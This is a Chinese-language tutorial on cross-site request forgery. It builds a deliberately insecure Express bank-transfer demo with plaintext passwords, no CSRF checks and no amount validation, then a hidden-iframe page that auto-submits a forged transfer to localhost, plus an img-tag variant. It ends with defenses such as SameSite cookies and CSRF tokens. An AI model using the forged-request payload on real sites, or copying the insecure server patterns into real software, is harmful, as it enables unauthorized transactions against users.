---
outline: deep
---

# CSRF攻击

## 一、CSRF攻击概念

CSRF（有时也称为 XSRF）是一类相关的攻击。攻击者使用户的浏览器在用户不知情的情况下向网站的后端发送请求。攻击者可以使用 XSS 载荷发起 CSRF 攻击。

## 二、CSRF实战演示

### 2.1、创建一个银行转账服务

```javascript
const path = require('path');
const express = require('express');

const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const session = require('express-session');

const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use(cookieParser());

app.use(
  session({
    name: 'SESSIONID',
    secret: 'your_secret_key',
    resave: false,
    saveUninitialized: true,
    cookie: {
      httpOnly: false,
    },
  }),
);

/**
 * 模拟数据库
 */
const userList = [
  {
    userId: '0001',
    username: 'zhangsan',
    password: 'zs123456',
    amount: 1000,
  },
  {
    userId: '0002',
    username: 'lishi',
    password: 'ls123456',
    amount: 1000,
  },
];

const indexPage = path.resolve(__dirname, 'views/index.html');

const loginPage = path.resolve(__dirname, 'views/login.html');

/**
 * 自定义授权中间件
 */
function requireAuth(req, res, next) {
  if (req.session.isLogin) {
    next();
  } else {
    res.redirect('/login');
  }
}

app.get('/', function (req, res) {
  res.redirect('/home');
});

app.get('/home', requireAuth, function (req, res) {
  res.sendFile(indexPage);
});

app.get('/login', function (req, res) {
  res.sendFile(loginPage);
});

/**
 * 自定义授权中间件
 */
function apiAuth(req, res, next) {
  if (req.session.isLogin) {
    next();
  } else {
    res.json({
      code: '0000',
      message: '用户未登录',
      data: null,
    });
  }
}

/**
 * 登录功能
 */
app.post('/api/login', function (req, res) {
  let data = req.body;
  const { isLogin } = req.session;
  if (!isLogin) {
    const user = userList.find((item) => item.username === data.username);
    if (user && user.password === data.password) {
      req.session.isLogin = true;
      req.session.username = data.username;
      res.json({
        code: '0000',
        message: '登录成功',
        data: null,
      });
    } else {
      res.json({
        code: '0000',
        message: '用户名和密码不正确',
        data: null,
      });
    }
    return;
  }
  res.json({
    code: '0000',
    message: '用户已登录',
    data: null,
  });
});

/**
 * 获取用户信息
 */
app.get('/api/userinfo', apiAuth, function (req, res) {
  const { isLogin, username } = req.session;
  if (isLogin) {
    const user = userList.find((item) => item.username === username);
    res.json({
      code: '0000',
      message: '请求成功',
      data: {
        ...user,
        isLogin: true,
      },
    });
  } else {
    res.json({
      code: '0000',
      message: '用户未登录',
      data: null,
    });
  }
});

/**
 * 登出功能
 */
app.post('/api/logout', apiAuth, function (req, res) {
  const { isLogin } = req.session;
  if (isLogin) {
    req.session.isLogin = false;
    req.session.username = null;
    res.json({
      code: '0000',
      message: '退出登录成功',
      data: null,
    });
    res.redirect('/login');
    return;
  }
  res.json({
    code: '0000',
    message: '用户未登录',
    data: null,
  });
});

/**
 * 转账接口
 */
app.post('/api/transfer', apiAuth, function (req, res) {
  const { username } = req.session;
  const data = req.body;
  // 当前用户
  const userIndex = userList.findIndex((item) => item.username === username);
  const transferUserIndex = userList.findIndex((item) => item.username === data.username);

  console.log(transferUserIndex > -1);

  if (transferUserIndex === -1) {
    res.json({
      code: '9999',
      message: '对方用户不存在',
      data: null,
    });
  } else {
    const user = userList[userIndex];
    const transferUser = userList[transferUserIndex];

    userList[userIndex] = {
      ...user,
      amount: user.amount - Number(data.amount), // 不做金额大小校验
    };

    userList[transferUserIndex] = {
      ...transferUser,
      amount: transferUser.amount + Number(data.amount), // 不做金额大小校验
    };

    console.log(userList);

    res.json({
      code: '0000',
      message: '转账成功',
      data: null,
    });
  }
});

app.listen(8080, () => {
  console.log('Server is running on http://localhost:8080');
});
```

转账登录页面 html 如下

```javascript
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0" />
    <title>转账页面</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB"
      crossorigin="anonymous" />
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-FKyoEForCGlyvwx9Hj09JcYn3nv7wiPVlz7YYwJrWVcXK/BmnVDxM+D2scQbITxI"
      crossorigin="anonymous"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  </head>
  <body>
    <div class="container">
      <h1 style="text-align: center">登录</h1>
      <div class="mb-3">
        <label
          for="username"
          class="form-label"
          >用户名</label
        >
        <input
          type="email"
          class="form-control"
          id="username"
          placeholder="请输入用户名" />
      </div>
      <div class="mb-3">
        <label
          for="password"
          class="form-label"
          >密码</label
        >
        <input
          type="email"
          class="form-control"
          id="password"
          placeholder="请输入密码" />
      </div>
      <div class="col-auto">
        <button
          id="submit"
          type="submit"
          class="btn btn-primary mb-3">
          确认登录
        </button>
      </div>
    </div>

    <script>
      $('#submit').click(function () {
        console.log($('#username').val());
        console.log($('#password').val());
        $.post('/api/login', { username: $('#username').val(), password: $('#password').val() }, function () {
          console.log('登录成功');
          location.replace('/home');
        });
      });
    </script>
  </body>
</html>
```

登录之后的首页 html 如下

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0" />
    <title>CSRF攻击</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB"
      crossorigin="anonymous" />
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-FKyoEForCGlyvwx9Hj09JcYn3nv7wiPVlz7YYwJrWVcXK/BmnVDxM+D2scQbITxI"
      crossorigin="anonymous"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  </head>
  <body>
    <div class="container">
      <h1 style="text-align: center">主页</h1>
      <p id="usernameText">用户名：</p>
      <p id="amountText">剩余金额：</p>
      <div>
        <div class="mb-3">
          <label
            for="username"
            class="form-label"
            >对方用户名</label
          >
          <input
            type="email"
            class="form-control"
            id="username"
            placeholder="请输入对方用户名" />
        </div>
        <div class="mb-3">
          <label
            for="password"
            class="form-label"
            >转账金额</label
          >
          <input
            type="amount"
            class="form-control"
            id="amount"
            placeholder="请输入转账金额" />
        </div>
      </div>
      <div>
        <button
          id="tranfer"
          type="button"
          class="btn btn-primary mb-3">
          转账
        </button>
        <button
          id="logout"
          type="button"
          class="btn btn-primary mb-3">
          退出登录
        </button>
      </div>
    </div>
  </body>
  <script>
    // 获取用户信息
    $.get('/api/userinfo', function (data) {
      console.log(data.data);
      const userInfo = data.data;
      $('#usernameText').text(`用户名：${userInfo.username}`);
      $('#amountText').text(`剩余金额：${userInfo.amount}`);
    });

    // 退出功能
    $('#logout').click(function () {
      $.post('/api/logout', {}, function () {
        location.reload('/login');
      });
    });

    // 转账
    $('#tranfer').click(function () {
      $.post('/api/transfer', { username: $('#username').val(), amount: Number($('#amount').val()) }, function (data) {
        if (data.code === '9999') {
          alert(data.message || '转账失败');
        } else {
          location.reload();
          alert('转账成功');
        }
      });
    });
  </script>
</html>
```

### 2.2、创建一个钓鱼网址

创建一个钓鱼网址服务

```javascript
const path = require('path');
const express = require('express');

const app = express();

app.use(express.static(path.join(__dirname, 'public')));

app.listen(8888, () => {
  console.log('Server is running on http://localhost:8888');
});
```

然后再创建有一个 index.html 作为一个钓鱼网址

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0" />
    <title>钓鱼网址</title>
  </head>
  <body>
    钓鱼网址，会有吸引你的网址
    <iframe
      src="./fish.html"
      width="0"
      height="0"></iframe>
  </body>
</html>
```

钓鱼网址会嵌入一个 iframe 标签，嵌入一个真是发送请求网址

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0" />
    <title>钓鱼网址</title>
  </head>
  <body>
    <form
      action="http://localhost:8080/api/transfer"
      method="POST">
      <input
        type="hidden"
        name="username"
        value="lishi" />
      <input
        type="hidden"
        name="amount"
        value="100" />
    </form>
  </body>
  <script>
    window.addEventListener('DOMContentLoaded', () => {
      document.querySelector('form').submit();
    });
  </script>
</html>
```

不仅可以通过 iframe 标签进行攻击，还可以使用 img 进行 get 请求攻击

```html
<img
  src="http://localhost:8080/api/transfer?username=lishi&amount=100" />
```

### 2.3、整个钓鱼过程

首先 zhangsan 用户登录之后后端会根据 session 会话判断当前用户已经登录，然后用户点击了钓鱼网址，钓鱼网址会调用转账接口就会实现转账成功。

## 三、防御CSRF

CSRF 攻击的本质是 `攻击者利用用户已通过身份验证的会话来执行未经用户意图的操作`。因此，所有防御手段的核心都是：`确保当前发出的请求是来自用户自愿操作的真实客户端，而不是一个伪造的、由攻击者生成的请求。`

防御手段可以分为两大类：`同源检测` 和 `令牌化`。现代最佳实践强烈推荐使用令牌化方法。

### 3.1、验证 HTTP Referer 和 Origin 头

服务器可以检查请求头中的 `Referer` 或 `Origin` 字段，判断请求是否来自合法的源（即你自己的域名）。

缺点：不是特别可靠、也有可能被绕过、配置复杂，可以作为补充检查，但绝不能作为主要的防御手段

### 3.2、SameSite Cookies

`SameSite` 是 Cookie 的一个属性，它允许你声明一个 Cookie 是否应随着跨站请求一起发送。这从源头上阻止了 CSRF 攻击中携带认证 Cookie 的可能性。

缺点：这是一个深度防御措施，不应作为唯一防御手段。因为并非所有浏览器都完全支持（尽管现代浏览器都已支持），且某些特定场景下可能仍需其他措施。

### 3.3、用户交互验证

对于特别敏感的操作（如转账、修改密码），强制进行额外的用户交互。例如

+ 重新输入密码
+ 输入图片验证码（CAPTCHA）
+ 使用手机/邮箱验证码

这虽然不是纯粹的 CSRF 防御，但它能有效阻止任何形式的自动化攻击（包括 CSRF），因为它需要用户主动参与，而这是攻击者无法伪造的。缺点是会降低用户体验。

### 3.4、 CSRF  Tokens（推荐方案）

‌原理：在用户提交表单时，服务器生成一个随机Token，并嵌入到表单中（如隐藏字段）。服务器在收到请求时验证Token的有效性。

实现步骤：

1. 服务器生成 Token 并存储在用户 Session 中
2. 将 Token 嵌入 post 请求当中
3. 用户提交表单时，服务器对比 Token 是否匹配